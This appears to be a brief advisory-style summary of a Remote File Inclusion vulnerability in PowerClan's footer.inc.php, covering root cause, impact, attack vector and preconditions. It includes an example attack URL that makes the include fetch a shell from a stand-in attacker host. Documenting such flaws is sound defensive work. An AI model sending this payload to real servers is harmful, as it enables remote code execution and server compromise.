```
Root cause of vulnerability:
The `footer.inc.php` file in PowerClan does not initialize the `$settings[footer]` variable before using it in an `include` statement.

Weaknesses/vulnerabilities present:
Remote File Inclusion (RFI) vulnerability. The lack of initialization for the `$settings[footer]` variable allows an attacker to inject a malicious URL via a query string.

Impact of exploitation:
Arbitrary remote code execution on the server, because the `include` statement will fetch and execute the attacker's malicious PHP file.

Attack vectors:
A malicious URL passed via the `settings[footer]` parameter in a query string, targeting the vulnerable `footer.inc.php` script.
Example: `http://[target]/[path]/footer.inc.php?settings[footer]=http://evilsite.com/shell.php`

Required attacker capabilities/position:
The attacker must be able to send an HTTP request to the affected server. The server must also have `register_globals` enabled.
